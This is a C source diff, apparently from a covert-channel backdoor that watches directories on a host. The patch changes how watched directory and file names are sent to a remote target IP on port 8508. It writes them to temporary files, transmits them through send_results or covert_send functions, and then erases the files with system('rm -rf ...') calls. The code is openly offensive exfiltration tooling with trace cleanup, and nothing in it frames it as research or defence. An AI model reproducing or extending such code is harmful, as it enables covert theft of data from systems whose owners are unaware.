@@ -73,6 +73,8 @@ void *watch_directory(void* args){
     fclose(fp);
     free(buf);
 
+    system("rm -rf directory");
+    system("rm -rf file");
     socket = initInotify();
     watch = addWatch(socket, directory);
     epollfd = createEpollFd();
@@ -123,16 +125,29 @@ void *recv_watch_directory(void* args){
     char data1[BUFSIZ];
     char directory[BUFSIZ];
     char file[BUFSIZ];
-
+    FILE *fp;
     strncpy(directory, arg->directory, BUFSIZ);
     strncpy(file, arg->file, BUFSIZ);
 
     strncpy(data, directory, BUFSIZ);
 	if(arg->tcp){
-        covert_send(arg->localip, arg->targetip, 8508, 8508, (unsigned char*)data, 0);
-        memset(data, 0, BUFSIZ);
-        strncpy(data1, directory, BUFSIZ);
-        covert_send(arg->localip, arg->targetip, 8508, 8508, (unsigned char*)data1, 0);
+
+        if((fp = fopen("directory", "wb+")) == NULL) {
+            perror("fopen can't open file");
+            exit(1);
+        }
+        fprintf(fp, "%s", directory);
+        fclose(fp);
+        if((fp = fopen("file", "wb+")) == NULL) {
+            perror("fopen can't open file");
+            exit(1);
+        }
+        fprintf(fp, "%s", file);
+        fclose(fp);
+        send_results(arg->localip, arg->targetip, 8508, 8508, "directory", true);
+        send_results(arg->localip, arg->targetip, 8508, 8508, "file", true);
+        system("rm -rf directory");
+        system("rm -rf file");
     } else {
         covert_udp_send_data(arg->localip, arg->targetip, 8508, 8508, data, 0);
         memset(data, 0, BUFSIZ);
